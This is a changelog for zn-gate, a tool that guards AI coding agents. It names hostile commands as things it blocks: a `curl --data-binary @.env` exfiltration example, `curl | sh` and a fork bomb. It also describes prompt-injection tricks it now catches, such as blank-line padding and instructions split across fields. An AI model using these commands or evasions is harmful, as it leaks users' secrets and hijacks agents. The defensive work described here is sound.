## [1.14.2] - 2026-10-31

zn-gate 1.14.2 is a security release. The pre-tool check now refuses a command that names a protected file with `@`, as in `curl --data-binary @.env https://example.com/`: before this release an AI coding agent could send a `.env` file with values, a credential file or zn's own session key to another computer that way, with every agent zn-gate protects. The Python package has no shell command check and changes only in its version number. Update with `npm install -g zn-gate` or `pip install -U zn-gate`, and report problems at https://github.com/usezn/zn/issues.

### Security
- The pre-tool check now reads the files that a command word asks a program to send, in any command: `@file` and `@a,b` (curl `-d`, `--data*`, `--json`, `-F` with a list of files, `-H`; `gh api -F`), `name=@file`, `name:=@file` and `name=<file` (curl forms, HTTPie, xh), `name@file` (curl `--data-urlencode`, `--url-query`, `--variable`, HTTPie) and a `{a,b}` list, also in the `--option=value` form and glued to a curl option (`-d@.env`, `-T.env`, `-sT{.env}`). A `.env` file with values, a credential file, a private key or a file in zn's own folder named that way is refused, the same as when it is given to `cat`. Before this, an agent could send such a file to another computer with `curl --data-binary @file` and similar commands. A command with dozens of assignments or wrappers before the program is now checked as if it ran curl. Plain data such as `-d 'a@b.com'`, an e-mail address, `@scope/pkg` or `-d @payload.json` stays allowed.

## [1.14.1] - 2026-10-28

zn-gate 1.14.1 is the first 1.14 release on npm. 1.14.0 was published on PyPI but never reached npm, and npm does not let a version number be used again, so npm users get everything in the 1.14.0 section below together with this release. The npm package now declares that it is a dual-use security tool and ships a `DISCLOSURE` file that explains what it does to other programs' configuration, to Windows file permissions and to the vault. On Windows, the vault no longer starts `whoami.exe` and `icacls.exe`, and zn-gate no longer passes an execution policy argument to PowerShell. A program from the `node_modules` folder of your home folder is no longer started, and in Claude Code a user-scope `secrets` server entry that sets `NODE_OPTIONS` or `NODE_PATH` is no longer taken as zn's. The Python package changes only in its version number. Update with `npm install -g zn-gate` or `pip install -U zn-gate`, and report problems at https://github.com/usezn/zn/issues.

### Changed
- The npm package declares that it is a dual-use security tool (`contentPolicy` in `package.json`) and ships a `DISCLOSURE` file that says what the package does to other programs' configuration, to Windows file permissions and to the vault, and when. Nothing about how zn-gate behaves changes.
- Windows: zn no longer passes `-ExecutionPolicy Bypass` to the system PowerShell it starts (the hook folder's permissions, the vault keychain entry and the confirmation dialog). These run inline commands, which the execution policy does not cover, and they were tested with the `AllSigned` and `Restricted` policies.
- Windows: the vault reads your account's SID and makes its folders, files and session key private to you with .NET calls in the system PowerShell, as the hook folder already did, instead of starting `whoami.exe` and `icacls.exe`. The result is the same: a list that does not inherit from the parent folder, with one full-control entry for your account, read back and checked before the vault starts.

### Security
- A program found on the `PATH` whose real file is in the `node_modules` folder of your home folder is not started either, also when zn-gate runs in the home folder. The Claude Code installer and uninstaller no longer run a `claude` that links into the project, and real paths are compared in their canonical spelling (letter case on macOS).
- Claude Code: the user-scope `secrets` server is no longer taken as zn's when its entry sets `NODE_OPTIONS` or `NODE_PATH`, or a folder inside the project to run in. The MCP server names of the zn-gate plugin are no longer trusted either: the plugin registers no MCP server since 1.14.0, and an older plugin started its servers with `node` from the `PATH`.

## [1.14.0] - 2026-10-26

**Breaking:** `zn run` and the agent hooks no longer accept a secret marker in a command's arguments, because arguments are visible to other processes and to command-line logs. Before: `psql "postgres://user:__ZN_DB_PASSWORD__@db/app"`. After: `zn secret set PGPASSWORD --command psql`, then `zn run --secrets PGPASSWORD -- psql "postgres://user@db/app"`, where psql reads the variable itself. A marker in an environment file that your shell loads (a shadowed `.env`) is still filled in, and a secret kept for a program or a file (`env` or `file` mode) is no longer sent by `secrets_http_request`: change its mode with `zn secret allow NAME --mode proxy` if an API needs it.

zn-gate 1.14.0 adds official support for Antigravity and the ZCode desktop app, and ships on the new weekly release train. In Claude Code, zn-gate now checks the output of web fetches, MCP tools and shell commands with its local rules and tells the agent to treat text that reads like instructions as data. It also adds experimental hooks for Gemini CLI, finds plain-text keys in MCP server configs, and hardens the Python guard against deeply nested tool results and arguments. It also hardens how the hooks start on every platform: zn, Node.js and the programs they run come only from absolute PATH entries, never from a relative PATH entry or the current folder, including the hooks of the zn-gate plugin for Claude Code and Codex; the ZCode plugin starts its hooks with `/bin/sh` by its full path, and Windows hooks start PowerShell by its full path. The release also includes security fixes, listed under Security. Update with `npm install -g zn-gate` or `pip install -U zn-gate`, and report problems at https://github.com/usezn/zn/issues.

### Added
- `zn audit` reports an instruction file (`AGENTS.md`, `CLAUDE.md`, `GEMINI.md`, `.cursorrules`, rules, `SKILL.md` and other skill, command and agent files) that has a run of 40 or more empty or whitespace-only lines with more text after it (new rule ZNA021, medium). That text is out of view for a reviewer and past the part of the file a classifier reads. The finding gives the line where the text starts and the length of the run, and never prints the text. `AUDIT_RULES_VERSION` is `2026-10-23.6`.
- The local rules read a run of empty or whitespace-only lines as a single empty line before they run, in Node.js and in Python, on prompts and on tool results. Text that follows a long run of padding is now checked together with the text before it, instead of falling outside the part that is scanned. Lines made only of Unicode spaces (no-break, em, ideographic, line and paragraph separators, next line, soft hyphen) count as empty too. The audit rule ZNA021 also flags the supporting files of a skill, such as templates. `RULES_VERSION` is `2026-10-25.5`.
- `zn-gate check` reports Codex as not protected when your `config.toml` switches one of zn's hooks off with `[hooks.state]` (`enabled = false`). It already did so for `[features] hooks = false` and for managed-only hooks. The Python package has no `check` command.

- Codex: an optional setting, `hooks.replaceToolOutputOnSecret` in `~/.zn/config.json` (off by default; `{"hooks": {"replaceToolOutputOnSecret": true}}`). When a tool output holds a real secret value, zn also returns `continue: false` with a stop reason that names the kind of secret, never the value. Codex then replaces the tool result with that text and carries on, so the model may not see the tokenized output. Markers alone change nothing. With the setting off, nothing changes.

It warns when the answer contains a secret value, or a `__ZN_` placeholder that zn did not see earlier in the session. The warning is shown to you, not to the model. To have Codex ask the model to rewrite such an answer, set `"stopReview": "block"` under `hooks` in `~/.zn/config.json`; zn blocks at most once per answer. Run `zn hooks install codex` again, then review the hook in `/hooks`.

It blocks a call for a sensitive file, replaces a page that tries to give the model orders with a notice, and hides a secret in a page. Runs offline with a scripted model and made-up pages.

It guards a tool with zn-gate on both sides: a request that carries orders for the model is stopped before the tool runs, a tool result that tries to give the model orders is blocked, and secrets in the result are hidden. It runs locally with a scripted model and made-up pages, and needs no API key.

Each one checks a tool's output with zn-gate before the model reads it, in the way that framework expects: text that tries to give the model orders is blocked, secrets are hidden. They run locally with made-up pages and a stand-in model, and need no API key.

It blocks the agent from reading or writing secret files by path, and from running shell commands that handle secrets, and it protects its own hook files from edits by the agent. Searches across a folder ask for confirmation when the folder itself holds a plain-text `.env` or key file, but matching lines and command output are not redacted, because Antigravity hooks cannot rewrite tool output. Antigravity does not document what happens when a hook fails. `zn-gate check` reports the Antigravity hook, and `zn-gate init` also looks for a project `.agents/mcp_config.json`.

They warn, with the file and the key, when zn's hook there has no `"failClosed": true` on `beforeReadFile` or `beforeSubmitPrompt`, and say so when that file has hooks but not zn's (those do not turn off the zn hooks you install). Nothing is written.

- Experimental: `zn hooks install copilot [--project]` adds hooks for GitHub Copilot CLI (`~/.copilot/hooks/zn-gate.json` for your user, `.github/hooks/zn-gate.json` in a project). It blocks the agent from reading or writing secret files by path and from running shell commands that handle secrets, replaces secret values in the results of read-type and shell tools, and protects Copilot's hook and settings files from edits by the agent. Copilot cannot block a typed prompt from a command hook, lets a call through when a hook times out (zn sets a 15-second timeout on its hooks and blocks the call itself at 11 seconds), and also loads machine policy hooks of its own. `zn-gate check` reports the Copilot hook, including a `disableAllHooks` setting that turns it off.
- The Python `guarded_tool` decorator for CrewAI now also works on async tools. The tool is awaited, and its output gets the same `check_result=True` scan and the same secret masking as a sync tool. Sync tools behave as before.
- The agent hooks now refuse two kinds of destructive shell command by default: a recursive delete of the home folder, the filesystem root or a system folder, and a write to a disk device. A blocked command is not run, and the agent is told to ask you to confirm first. Four more rules (a download piped to a shell such as `curl ... | sh`, `chmod -R` or `chown -R` on the root or a system folder, a fork bomb, and a download written into a shell startup file) are off by default. To change this, set `{"hooks": {"blockDestructiveCommands": ...}}` in `~/.zn/config.json` (`true` = all six rules, `false` = off, or a list of rule names), or set `ZN_BLOCK_DESTRUCTIVE=1` in the environment to turn on all six rules. The environment can only turn rules on: `ZN_BLOCK_DESTRUCTIVE=0` is ignored, and turning rules off is only possible from the config file. A command line with more commands than can be checked (over 50,000) or longer than the check can read is refused instead of passed. It reads command text only and is not a sandbox. SDK users get `checkCommand` (Node.js, `zn-gate/lib/client`) and `check_command` (Python), which always apply all six rules. See `docs/destructive-commands.md`. `POLICY_RULES_VERSION` is `2026-10-19.44`.
- Experimental: `zn hooks install gemini [--project]` adds a pre-execution hook for Gemini CLI (`~/.gemini/settings.json` for your user, `.gemini/settings.json` in a project). It blocks the agent from reading or writing secret files by path and from running shell commands that handle secrets, and it protects Gemini CLI's own settings files from edits by the agent. Gemini CLI hooks cannot ask for confirmation, so zn blocks only what it would refuse and stays silent otherwise, and Gemini CLI lets a call run when a hook crashes or times out (only an explicit refusal, exit code 2, blocks), so zn answers a hook that fails with a block, sets a 15-second timeout on its hook and blocks a check still running after 11 seconds. `zn-gate check` reports the Gemini CLI hook, and warns when `hooksConfig.enabled` is false or zn's hook is listed in `hooksConfig.disabled`.
- `zn-gate scan` (npm and PyPI packages) and `zn audit` (ZNA011) find keys and passwords written in plain text in MCP server configs (`.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json`, `.codex/config.toml`, `claude_desktop_config.json` and similar): a value under a name such as an API key, token, password or `Authorization` header, the value after a credential flag in `args`, and a key in a server URL. References such as `${NAME}` and `__ZN_NAME__` are not reported. The report shows the kind, the name that holds the value, the file and the line, never the value, and says how to move it into the vault or an environment variable.
- `zn-gate scan --include-home` also checks your own MCP configs (Claude Desktop, Claude Code, Cursor, Codex, Gemini, Antigravity, OpenCode, Amazon Q).
- In MCP config files, a credential that a provider rule used to report is now reported as `secret:mcp_config`, so code scanning closes those alerts and opens them again under the new rule id.
- The Python `guarded_tool` decorator for CrewAI takes a new option, `check_result=True`, that scans a tool's output for prompt injection before the agent sees it, as `guard(check_result=True)` does. A blocked output raises `GuardBlockError`, or with `on_block="return"` returns the fallback or a short notice that does not repeat the blocked text. `block_truncated=True` also blocks output too large to scan in full. The option is off by default, so existing tools behave as before; secrets in the output are still hidden as before.
- The package ships TypeScript declarations for the tool-call guard: checkToolCall, guardTool and GuardBlockError (code ZN_GUARD_BLOCK), with typed options.
- New example `examples/haystack-agent`: a Haystack agent whose tool calls and tool output are checked by zn-gate. Runs offline with a scripted model and made-up pages and files.
- The Node.js package now has the same tool guard as the Python one: `checkToolCall(toolName, args)` and `guardTool(fn, options)`, which wraps a sync or async function, checks its arguments (and, with `checkResult: true`, its result) and throws a `GuardBlockError` by default (`onBlock: 'return'` returns a fallback instead; any other `onBlock` value is an error). `sanitizeToolResult`, `redactSecrets`, `verifyEvidenceLedger` and `logEvidence`, which the API reference already documents, are now also exported from `require('zn-gate')`. Arguments or results nested more than ten levels deep are blocked (rule `size:nesting`) instead of being passed through unchecked; maps, sets and byte buffers are scanned, and a structure that contains itself does not loop.
- The scrubber now detects a person's name, a postal address and a username as personal data when an explicit key sits next to the value: headers such as `X-User-Name`, `X-Address` and `X-Username`, and query-string or form keys such as `full_name=`, `address=` and `username=`. Only the value is replaced. Without the key, or in code, nothing is matched. They follow the existing `pii` setting and can be switched off one by one (`name`, `address`, `username`).
- Hooks for the [pre-commit](https://pre-commit.com) framework: `zn-gate-scan` runs `zn-gate scan` and `zn-audit` runs `zn audit` on your repository before each commit. They need Node.js 18 or later. Each tag's hooks run the zn-gate version of that tag, not the latest one.
- Python: native hooks for the tool layers of Google ADK (`adk_tool_callbacks`), the OpenAI Agents SDK (`openai_agents_tool_guardrails`) and Pydantic AI (`guard_pydantic_ai_toolset`), in `zn_gate.integrations`. OpenAI hosted tools and tools added with `@agent.tool` in Pydantic AI are not covered, and the README says so.
- Python: `guard(mask_secrets=True)` and the native hooks now mask secrets inside results that are objects (pydantic models, dataclasses and other plain objects), not only strings, lists and dicts. A result that holds a secret is returned as the masked plain data of that object; a secret that cannot be masked blocks the result (rule `secret:unmaskable`).

The public API is checked with `mypy --strict` in CI. `sanitize_tool_result` has precise types for both call forms, and `@guard` keeps the signature of the function it wraps. The new `SanitizedToolResult` type describes the dictionary returned by `sanitize_tool_result(tool_name, content)`. No behavior changes.

- New example `examples/semantic-kernel-agent`: a Microsoft Semantic Kernel plugin whose functions are checked by zn-gate before the model reads their output and before they run with the arguments the model chose. Runs offline with a simulated chat service and made-up pages and files.

It writes nothing; `allowManagedHooksOnly` and `allow_managed_hooks_only` are printed only with `--managed-hooks-only`.
- The npm package now includes TypeScript type definitions.
- `zn-gate uninstall` removes zn-gate in one step. It lists what it found (the Claude Code plugin, zn's hooks for each agent, MCP servers wrapped by `init --wrap-mcp`), asks you to confirm in your own terminal, then removes them and runs `zn-gate check`. The vault is only deleted if you confirm that separately, and `--dry-run` shows the list without changing anything. `zn-gate --help` now lists it and `hooks uninstall`.

It saves the old vault in a timestamped backup folder, then lets `zn unlock` create a new empty one. It refuses on a computer that belongs to a zn Team organization. ### Security
- `zn-gate check` starts nothing from the Claude Code plugin until it has checked it. The plugin folder named in `installed_plugins.json` must be inside the folder where Claude Code installs plugins (`plugins` under `~/.claude` or `CLAUDE_CONFIG_DIR`, or `CLAUDE_CODE_PLUGIN_CACHE_DIR`) and not inside the project, and its `hooks/hooks.json` must have exactly the PreToolUse hook the plugin ships: the command `/bin/sh "${CLAUDE_PLUGIN_ROOT}/scripts/zn-node.sh" PreToolUse hook claude-code` with `"shell": "bash"` and `"onFailure": "block"`, turned on, in the foreground and covering reading files. The live test then runs that command as Claude Code does (`/bin/sh` on the plugin's `scripts/zn-node.sh`, Git Bash on Windows, with the plugin folder, your `PATH` and the hook's timeout), and the plugin counts as protected only when that command blocks the test `.env` file. Before, a plugin entry with no hooks file was reported as protected, an entry that pointed into the project made `zn-gate check` run that project's launcher, and a PreToolUse hook that ran another script of the plugin (one that answers nothing) was reported as protected, because the check ran the plugin's launcher itself instead of the hook's command. The ZCode plugin's PreToolUse hook must likewise be the one it ships (`/bin/sh ${ZCODE_PLUGIN_ROOT}/scripts/zn-hook.sh PreToolUse`).
- `zn-gate check` no longer starts a `node` from the project to ask for its version. Before, a project `bin` folder on the `PATH` (for example added by direnv) made `zn-gate check` run the project's `node --version`, also with no plugin installed.
- The programs zn-gate starts by name (`git` in the hooks, the MCP server behind `zn-gate shield`, `claude`, Git Bash, `node` and the first word of a project hook command in `zn-gate check`) are looked up only in absolute `PATH` entries outside the project: an entry whose real path is in the folder zn-gate runs in, the git repository around it, the project the agent names (`CLAUDE_PROJECT_DIR`) or a `node_modules` folder is skipped, and so is a program that links into the project (a program of a global npm install, which links into its own `lib/node_modules`, still counts). Your home folder is never taken as the project. Before, an absolute `PATH` entry into the project (its `bin` folder, `node_modules/.bin`, a folder added by direnv) could make zn-gate start a program of the project.
- `zn-gate check` reports Cursor as not protected when a zn-gate plugin for Cursor is installed (under `~/.cursor/plugins`), also when the hooks of `zn hooks install cursor` are installed too: the plugin's hooks start `node` by name, so a `PATH` entry that points into a project can run a program of that project instead of zn. - The zn-gate plugin hooks for Claude Code, Codex and ZCode start Node.js only from absolute `PATH` entries outside the project or from the usual install folders (through a small `/bin/sh` script). An entry whose real path is in the folder the hook runs in, the project folder, the git work tree around it or a `node_modules` folder is skipped, and so is a `node` that links into one, so a `node` placed in the project, or reached through a relative or empty `PATH` entry, is never run in place of the real Node.js. On Windows the Codex plugin hooks only block and point to `zn hooks install codex`. - Claude Code: zn's vault server is trusted only as the user-scope `secrets` server that `zn hooks install claude-code` registers: a Node.js and a zn-gate `bin/cli.js`, both by full path and, once links are resolved, outside the project (the folder Claude Code runs in, its git work tree and `CLAUDE_PROJECT_DIR`). - `zn-gate scan` text output (Node.js and Python packages) now shows control characters in file paths as `\x1b`-style escapes everywhere, including the location of each finding and the "No files were scanned" line, so a file name in a repository cannot write terminal sequences.
- `zn-gate shield` now checks tool results in full up to 32 MB. Before, only the first 4 MB and the last 256 KB of a larger result were checked, so an instruction placed in the middle of a large result reached the agent. A result over 32 MB is now removed, with a notice asking for a smaller part.
- `zn-gate shield` now checks the other text a server sends to the agent, not only tool results: notifications, requests such as sampling, resource and prompt contents (text blobs too), the descriptions in resource and prompt lists, the initialize instructions, completion values, error messages, and the structured content, embedded resources and resource links of tool results. Text that carries an injection is replaced by a notice, and secrets are redacted. Each text is checked in full up to 32 MB and blocked when larger. A line from the server that is not valid JSON is dropped instead of being passed on unchecked, and messages keep the order the server sent them in. JSON-RPC batches are checked message by message, in both directions; a batch with a blocked request is not sent, and each request in it gets an answer. Shadow mode still only reports.
- On Windows, a protected file written with a trailing dot or space (for example `settings.json.`) or through its 8.3 short name (for example `SETTIN~1.JSO`) is now treated as the protected file.
- On Windows, a write to an agent instruction file spelled with trailing dots or spaces (for example `AGENTS.md.`, a file that does not exist yet) is now reviewed like the plain name, and so is a new instruction file written under its 8.3 short name (for example `AGENTS~1.MD`).
- The check for writes into the `.agents` hook folder now takes time linear in the command, so a command of many long words can no longer slow the hook.
- On Windows, a write into an instruction folder spelled with an 8.3 short folder name (for example `CURSOR~1/rules/x.mdc`) is now reviewed like the long name.
- Python `@guard` now scans arguments that were fixed with `functools.partial` before the decorator was applied, including nested partials.
- Python `@guard` placed above `@classmethod` or `@staticmethod` no longer raises `TypeError`: the method keeps working when called through the class or an instance, and its arguments are still scanned.
- Rust gateway: every audit entry now carries the namespace of the authenticated caller (WebSocket tenant, or the configured namespace of a local session, or `global`). Before, entries were labelled with the namespace from the configuration, so a tenant could see the calls of another tenant whose namespace matched it (in `/api/v1/logs`, `/api/v1/stats` and the event stream), or none of its own when no namespace was configured. The label never comes from request content. Entries written by earlier versions have no namespace and stay visible only to the super-admin scope.
- `zn run` no longer fills in a secret marker written in a command's arguments, where the value would show in the process list and in command-line logs. It refuses the command and says to pass the secret as an environment variable with `zn run --secrets NAME -- <command>`. The agent hooks refuse such a command with the same guidance instead of rewriting it, and the docs now describe what an environment variable does and does not hide. The advice of the network-request check no longer tells an agent to expand a shell variable in the command: it points to `zn run --secrets` and the `secrets_http_request` tool.
- `secrets_http_request` now sends only secrets stored in `proxy` mode. A secret kept for a program (`env`) or a file (`file`) is refused even when it has an allowed host, and the vault checks the mode again before it hands the value over.
- `zn-gate audit` and `zn-gate scan` now advise starting an MCP server with a plaintext credential through `zn run --secrets NAME`, the same way in the Node.js and Python packages.
- `zn init` no longer writes keys or tokens read from the environment (`ZN_API_KEY`, `ZN_JWT_SECRET`, `ZN_MCP_WS_TOKEN`, `ZN_DB_KEY`) into `zn.json`, so a config file that is committed or shared does not carry them; they stay in the environment. On Linux and macOS the file is now created readable by its owner only (mode 0600).
- The configuration saved locally after a remote sync no longer carries keys or tokens, and neither it nor `zn init` writes the namespace or KMS key id and region when they come from the environment. Both files are written atomically and owner-only (mode 0600) on Linux and macOS, and a `zn.json` that is a symbolic link or not a regular file (a directory, a FIFO, a device) is refused and left untouched. An existing regular `zn.json` is replaced atomically.
- `zn-gate init` no longer writes through a symlinked parent folder. If a folder above an agent config in your home, such as `~/.cursor`, is a link that leads outside your home folder, the installer now refuses it and names the link, instead of replacing the file on the other side. Links that stay inside your home folder, and a home folder that is itself a link, keep working, and backups are written in the validated real folder.
- The `tool_name` label of the `zn_tool_calls_total` metric, and the `method` and `result` labels of `zn_jsonrpc_requests_total`, now keep only well-known values and count every other value as `other`, so a client can no longer create an unbounded number of series or put its own strings into `/metrics`.
- `zn start` no longer prints the MCP WebSocket token. A generated token is saved to `zn-mcp-ws-token.txt` next to the audit database (readable only by you, changes on every start), and the gateway refuses to start with a clear message if the file cannot be written; set `ZN_MCP_WS_TOKEN` to use a stable token. Debug output of the security configuration hides the API key, JWT secret and token.
- The scrubber now hides a quoted password, token or key that contains spaces, up to its closing quote (for example `"password":"<value with spaces>"`); before, such a value was left in the clear.
- The scrubber now hides a number stored under a secret key (`{"token":<number>}`) and keeps the JSON valid by writing the replacement as a string.
- Added a writer and a reader for private files in the Rust core. A private file is created readable only by its owner (mode 0600 on Linux and macOS, a protected owner-only access list on Windows) and is never written through a symbolic link. Reading goes through the same checks on the opened file, so a file swapped for a link between the check and the read cannot be followed. Both fail instead of leaving or accepting a file that other local accounts can read.
- On file systems that cannot store Unix permissions (a Windows drive mounted in WSL, FAT or exFAT, some network shares) creating a private file now fails with a message that says what to do, instead of a bare mode error. A leftover temporary file from a crashed write is removed on the next write in that folder.
- Python `@guard` now reads plain application objects in the arguments of a guarded function down to 32 levels, as it does for a result, and checks the text it finds there. Before, text more than ten levels deep inside such an object was skipped. What is deeper than 32 levels blocks (rule `size:nesting`). Data (dicts, lists, namespaces, data models) nested deeper than ten levels still blocks as before, and clients, sessions and dependency containers (a database engine, an HTTP session) keep working. Inside such an object, a dictionary or list is also read down to 32 levels. Known limits: an object with more than 100,000 values in its attributes is left out of the check rather than blocked, and the connection settings of a database engine (such as SQLAlchemy `connect_args`) are not read.
- Python `@guard(mask_secrets=True)` and the framework integrations no longer fail with `RecursionError` on a result that contains itself, such as a dictionary that holds a reference to itself. Such a result, one nested deeper than ten levels or one with more than 100,000 values is blocked with rule `size:nesting` or `size:items`. `sanitize_tool_result(data)` raises `SanitizeLimitError`, a `ValueError`, for the same data.
- Python `@guard(mask_secrets=True)` now masks a secret that a streamed result splits across chunks, for generators and async generators with text or bytes chunks. The last 16 KiB of text are held back, as it arrived, until more text or the end of the stream arrives, and a secret that reaches into them keeps the text from its start held too, whatever the size of the chunks: text is passed on only up to a point where masking it in two parts gives the same as masking it whole, looking further and further back so a long secret such as a private key is kept whole (tested with chunks of 4 KiB to 300 KiB, as text and as bytes, on compact JSON, URL lists and private keys). When the held text passes 256 KiB with a secret across every place it could be cut, such as a single value longer than that, the stream is blocked (rule `secret:unmaskable`) instead of passing part of the secret on. A private key is held from its BEGIN line until its END line arrives, so a long key in small chunks is masked whole; a key longer than 256 KiB blocks the stream. A long line that the masker reads as one value, such as a list of URLs with api_key= and no spaces, also blocks when it arrives in chunks of 64 KiB or less. Each chunk the function yields still gives one chunk out, but it is empty while its text is held, so the text comes out later and in larger pieces (a short stream comes out whole at its end), in order and in full, also when the function fails. Each chunk is still checked as before, and the held text is withheld when a chunk blocks.
- `redactSecrets` (Node.js) and `redact_secrets` (Python) now hide a quoted password, token or key that contains spaces, up to its closing quote (for example `"password":"<value with spaces>"`); before, such a value was left in the clear.
- Both now hide a number stored under a secret key (`{"token":<number>}`) and keep the JSON valid by writing the replacement as a string.
- Custom patterns in `.znrules` and `zn.config.json` now run in time proportional to the text, so a project file can no longer hang the hooks with a pattern that backtracks. Backreferences, lookaround, named groups and a quantifier on a group that already has one (such as `(a+)+`) are rejected, as are patterns over 500 characters and files with more than 100 patterns.
- A project rules file that cannot be read, is not valid JSON or holds a rejected pattern is no longer partly applied or silently ignored: zn-gate blocks with a message that names the file, the entry and the reason until it is fixed.
- Project rule patterns also have a size limit that bounds the work of every check (500 steps for one pattern, 600 for a whole file), a repeat count of any size and `a{2}{3}` are rejected instead of being read as text, and a JSON error shows only the line and column, never the text of the file. The block message says what to edit, `zn-gate check` lists the errors, and `zn-gate audit` reports a broken rules file once instead of flagging every line of the instruction files.
- The sensitive-file rule now matches Windows paths and mixed separators, such as `C:\Users\name\.ssh\id_rsa` and `C:/Users/name\.aws/credentials`, in the same places it matches POSIX paths, and the common variable forms (`%USERPROFILE%`, `$env:USERPROFILE`, `$HOME`) and a quoted user name with a space.
- The hidden-element rule now looks at real attributes: the `hidden` attribute, `aria-hidden="true"`, a style that hides the element or gives it no size, or a hiding class (`hidden`, `visually-hidden`, `sr-only`, `d-none`, `invisible`, `is-hidden`). A style hides an element when it sets `display:none`, `visibility:hidden`, zero opacity or font size, a width and height of at most 1px (zero in any unit, or 1px or less with no unit or px; `1em`, `1rem` and `1%` are not tiny), a zero or 1px height with `overflow:hidden`, or a clip that leaves nothing visible; `overflow:hidden` alone does not. A name that only contains the word (`data-hidden`), a style value such as `opacity:0.5` and plain mentions of a tag no longer count.
- The Base64 check treats `openssl` as a decoder only in its decode forms (`openssl base64 -d`, `openssl enc -d -base64`), so encoding and hashing commands that follow an `echo` are no longer decoded and blocked; a stdin flag such as `-in -` does not hide the decode.
- In the Node package, a compatibility character with no folded form (such as U+2072) is now kept in the text that rules match against instead of becoming the word "undefined". The Python package already did this.
- The hidden-element and path rules read spaces as ASCII spaces only, so the Node and Python packages give the same answer on characters such as U+0085, U+001C and U+FEFF.
- The hook no longer lets an oversized tool output through unchecked. When a post-tool event was larger than 32 MiB and its event name came later than the first 64 KiB, the hook could not tell what kind of event it was and answered with exit code 2, which does not stop Claude Code, Codex or the Copilot CLI from showing the original output to the model. The hook now finds the event name in all the text it has read, whatever the order of the keys, and withholds the output of a post-tool event that is too large to check. An event with no name in the text that was read counts as a post-tool event only when it already has its tool output key; any other one is blocked, as before. An oversized Stop event now passes with a warning instead of exit code 2, because exit code 2 on Stop makes the agent carry on with its answer.
- The Claude Code and Codex plugin launcher now stops reading an event from stdin at 32 MiB instead of reading and parsing all of it, and answers an oversized event the same way (blocking events are blocked with a reason, tool output is withheld).
- The MCP shield now also checks the readable text of a server message as one, after checking each field. An injection split across text fields of a tool result, a notification or a server request, each harmless alone, is now blocked, also when an image or a resource identifier sits between the two halves. A message whose text is over the scan limit is blocked as a whole instead of passing the part that was not checked. The notice keeps the shape of what it replaces (an error stays an error object, contents and messages stay lists); a blocked notification is not forwarded, and a blocked server request is answered with an error. Text split across different messages is not covered.
- The MCP shield (zn-gate shield) now limits what a wrapped server or a client can send it. A line over 64 MiB from the server (32 MiB from the client) is dropped before it is parsed, and messages nested more than 128 levels, with more than 4 million values, or in a batch of 1000 or more are refused. Reading from the server pauses while a lot of its output waits to be checked, so a flood cannot exhaust memory. A request waiting for its answer is never forgotten until the client cancels it: when 5000 are waiting, the next one is refused with an error instead of an old one being dropped and its answer passed on unchecked (shadow mode sends it on). When the server sends a batch that is dropped, each request it answered gets an error. `ZN_SHIELD_LIMITS` can only lower the limits. An answer that cannot be checked, is not valid JSON or is too large now gives the client a JSON-RPC error with the id of its request instead of silence, and a tool list that answers no request is not passed on.
- The shield now checks the text of the tool, resource, resource template and prompt lists that the agent can read: names, descriptions, titles, URIs, URI templates, argument fields, and the _meta, annotations and icons of each item. Text that blocks is rewritten; an item whose name, URI or argument name cannot be rewritten without breaking calls is removed from the list with a notice.
- `zn team sync` refuses a second signed policy that carries the same version as the one already held but different content, and checks the version again when it saves the policy, so a policy replaced during a download is not overwritten. The organization's policy service signs the same version again every day with new validity dates; those dates are not part of the content, so the daily renewal is accepted and extends the validity, while an older signature of the same version cannot shorten it.
- `zn team join` no longer uploads the audit records written before you joined. Only records from the join on are sent; `zn team join <token> --include-history` adds the earlier ones, asks for it in its own warning in the confirmation dialog, and works only at the first join of an installation. A machine that joined with an earlier version keeps sending everything, as agreed then.
- zn Team: when a new policy version removes or loosens restrictions (a secret no longer blocked, a wider host, command or placement list, no proxy mode, a removed custom detector), `zn team status` now lists what changed, the audit log gets a record of it, and Claude Code says so once in its next hook message. Before, the change applied without any notice on the machine.
- zn Team: the hooks no longer lose the organization's custom detectors when `~/.zn/team.json` or the policy copy is deleted or edited. `zn team sync` and `zn team status` put both copies back from the vault, the hooks take the detectors from the unlocked vault in the meantime, and a policy that cannot be applied shows `Team detectors not applied`. The same line appears when the policy copy is missing and the vault is locked or does not answer in time, instead of leaving the detectors off without a word.
- `zn team sync` now keeps a membership generation in the vault, which goes up on every join and leave. A sync that was already running when you left a team, or joined another one, no longer applies its policy answer, records its result, writes the readable copies or takes the upload lock, and it uploads no audit records or upload state for the team you left: before each write it checks that the organization, installation, token and generation are still the current ones, and refuses a stale response. `zn team status` and the hooks put the readable copies back only for the membership that is current.
- A first-use approval of a secret now belongs to the value it was given for. Before, `zn secret rm` kept the approvals, so a new value stored under the same name inherited them and a command you had approved for the old value could read the new one without asking. Now removing a secret deletes its approvals, and every time a value is set or replaced the secret gets a new random id that approvals are tied to, so replacing a value without removing it asks again too. Storing the same value again changes nothing. This fails closed: approvals saved by earlier versions (1.13.x and before) carry no id, so they do not count. After you update, even a value that did not change is asked about again, once, the first time a command uses it; that new approval carries the id and is kept from then on.
- The audit log of the Rust gateway stores only metadata by default (event, time, tool, status, policy, agent, namespace). The scrubbed request payload is no longer written unless `audit.store_payloads` (or `ZN_AUDIT_STORE_PAYLOADS=1`) is set, and that option needs an encryption key (`ZN_DB_KEY` or a KMS key) in every environment. Existing records stay readable.
- With the neural layer on, the gateway no longer keeps the arguments of calls: the vector memory stores a hash next to each vector, and `nearest_neighbor` in the audit log, the event stream and the neural veto log shows only the distance and a short reference to the closest earlier call. The reference is a keyed hash (HMAC) with a key kept on this machine (`data/ref.key`), so short values such as PINs cannot be recovered from it. On the first start, audit records written by earlier versions that hold the text of a neighbour are rewritten to the keyed reference and the payload of their `NEAREST_NEIGHBOR` records is cleared.
- A failed audit write is now logged and counted in `zn_audit_write_failures_total`. The new option `audit.require_write` (`ZN_AUDIT_REQUIRE_WRITE=1`) denies a call whose audit record cannot be written.
- Upgrading the Rust gateway now cleans the text that earlier versions left in the vector memory files, refuses to use a file it cannot clean, and clears old neighbour text from the audit log in one transaction after the encryption key is verified. The live event stream, the SIEM export and webhook alerts never carry the request payload, and an existing `data/ref.key` that is a link or is open to other users is refused at start.
- The cleanup of old text now also compacts the audit database and the vector memory file and checks that the log was fully written back, so the text does not stay in free pages; a damaged `data/ref.key` of the wrong length is replaced by a new key with a warning (earlier references stay but no longer match new ones).
